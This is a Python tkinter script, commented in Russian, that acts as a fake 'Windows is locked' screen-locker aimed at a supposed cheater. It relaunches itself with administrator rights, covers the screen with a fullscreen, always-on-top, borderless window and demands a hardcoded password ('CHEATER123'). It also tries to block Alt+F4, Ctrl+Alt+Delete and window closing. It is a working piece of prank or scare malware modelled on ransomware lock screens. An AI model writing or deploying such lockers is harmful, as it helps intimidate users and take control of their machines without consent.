import tkinter as tk
from tkinter import messagebox, ttk
import sys
import ctypes
import platform
import time

# Проверка прав администратора
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Автозапрос админки, если скрипт запущен без неё
if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

# Проверка ОС (только Windows)
if platform.system() != "Windows":
    messagebox.showerror("Ошибка", "Этот скрипт работает только на Windows!")
    sys.exit(1)

# Основное окно блокировки
root = tk.Tk()
root.title("Windows заблокирована")
root.attributes("-fullscreen", True)  # Полный экран
root.attributes("-topmost", True)    # Поверх всех окон
root.overrideredirect(True)          # Убрать рамку (нет крестика)

# Фон (чёрный с красным градиентом)
bg_frame = tk.Frame(root, bg="black")
bg_frame.pack(fill="both", expand=True)

# Стиль в духе 2010-х
style = ttk.Style()
style.configure("TButton", font=("Arial", 16), foreground="red", background="black")
style.configure("TEntry", font=("Arial", 24), foreground="red", fieldbackground="black")

# Надпись "Windows заблокирована"
error_label = tk.Label(
    bg_frame,
    text="Windows заблокирована",
    font=("Arial", 50, "bold"),
    fg="red",
    bg="black"
)
error_label.pack(pady=50)

# Подпись "ЧИТЕР"
cheater_label = tk.Label(
    bg_frame,
    text="Обнаружено читерство!\nВведите пароль для разблокировки",
    font=("Arial", 20),
    fg="yellow",
    bg="black"
)
cheater_label.pack(pady=20)

# Поле для пароля
password_var = tk.StringVar()
password_entry = ttk.Entry(
    bg_frame,
    textvariable=password_var,
    show="*",
    style="TEntry"
)
password_entry.pack(pady=30)

# Кнопка разблокировки
def unlock():
    if password_var.get() == "CHEATER123":
        messagebox.showinfo("Успех", "Система разблокирована!")
        root.destroy()
    else:
        messagebox.showerror("Ошибка", "Неверный пароль!")
        password_var.set("")

unlock_btn = ttk.Button(
    bg_frame,
    text="Разблокировать",
    command=unlock,
    style="TButton"
)
unlock_btn.pack(pady=10)

# Блокировка Alt+F4 и других сочетаний
root.bind("<Alt-F4>", lambda e: "break")
root.bind("<Control-Alt-Delete>", lambda e: "break")
root.protocol("WM_DELETE_WINDOW", lambda: None)

# Запуск
root.mainloop()